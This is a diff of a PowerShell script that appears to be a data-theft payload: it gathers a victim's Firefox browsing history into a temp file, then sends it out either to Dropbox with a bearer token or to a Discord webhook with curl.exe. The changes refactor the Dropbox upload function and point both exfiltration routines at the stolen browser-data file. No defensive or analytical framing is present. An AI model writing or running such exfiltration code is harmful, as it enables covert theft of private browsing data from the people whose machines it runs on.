@@ -45,9 +45,17 @@ Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\--BrowserData
 
 # Upload output file to dropbox
 
-function dropbox {
-$TargetFilePath="/$ZIP"
-$SourceFilePath="$env:TEMP\$ZIP"
+function DropBox-Upload {
+
+[CmdletBinding()]
+param (
+	
+[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
+[Alias("f")]
+[string]$SourceFilePath
+) 
+$outputFile = Split-Path $SourceFilePath -leaf
+$TargetFilePath="/$outputFile"
 $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
 $authorization = "Bearer " + $db
 $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
@@ -57,9 +65,9 @@ $headers.Add("Content-Type", 'application/octet-stream')
 Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
 }
 
-if (-not ([string]::IsNullOrEmpty($db))){dropbox}
+if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $env:TMP\--BrowserData.txt}
 
-############################################################################################################################################################
+#------------------------------------------------------------------------------------------------------------------------------------
 
 function Upload-Discord {
 
@@ -84,7 +92,7 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:tmp/$ZIP"}
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $env:TMP\--BrowserData.txt}
 
  
 
